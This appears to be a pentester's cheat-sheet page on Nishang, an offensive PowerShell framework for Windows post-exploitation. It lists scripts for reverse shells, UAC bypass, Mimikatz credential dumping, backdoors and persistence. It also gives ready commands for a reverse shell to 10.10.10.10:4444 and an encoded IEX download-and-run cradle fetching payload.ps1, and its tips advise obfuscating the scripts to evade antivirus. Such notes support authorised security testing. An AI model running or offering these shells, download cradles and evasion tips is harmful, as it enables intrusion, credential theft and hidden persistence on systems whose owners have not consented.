# Nishang

**Type:** PowerShell Framework
**Purpose:** Offensive PowerShell scripts and payloads
**Platform:** Windows
**Tags:** #powershell #post-exploitation #payloads #shells #windows

---

## Installation

```powershell
git clone https://github.com/samratashok/nishang.git
cd nishang
Import-Module .\nishang.psm1
```

---

## Common Scripts

**Shells:**
- Invoke-PowerShellTcp.ps1 - Reverse/bind shell
- Invoke-PowerShellTcpOneLine.ps1 - One-liner shell
- Invoke-PowerShellUdp.ps1 - UDP shell

**Execution:**
- Invoke-Encode.ps1 - Encode commands
- Execute-Command-MSSQL.ps1 - SQL command execution
- Execute-DNSTXT-Code.ps1 - DNS TXT code execution

**Escalation:**
- Invoke-PsUACme.ps1 - UAC bypass
- Remove-Update.ps1 - Remove Windows updates

**Exfiltration:**
- Copy-VSS.ps1 - Volume Shadow Copy
- Invoke-Mimikatz.ps1 - Credential dumping
- Get-Information.ps1 - System information gathering

**Backdoors:**
- HTTP-Backdoor.ps1 - HTTP backdoor
- DNS-TXT-Backdoor.ps1 - DNS TXT backdoor
- Add-Persistence.ps1 - Persistence mechanisms

---

## Example Usage

```powershell
# Reverse shell
Import-Module .\Shells\Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444

# Encoded command
.\Utility\Invoke-Encode.ps1 -DataToEncode "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/payload.ps1')"

# Information gathering
.\Gather\Get-Information.ps1
```

---

## Pro Tips

💡 **PowerShell Empire Alternative**: Similar functionality
💡 **Modular**: Pick scripts as needed
💡 **Evasion**: Combine with obfuscation techniques
💡 **AV Detection**: May be signatured, consider modification

---

## Resources

- GitHub: https://github.com/samratashok/nishang
- Author: @samratashok (Nikhil Mittal)
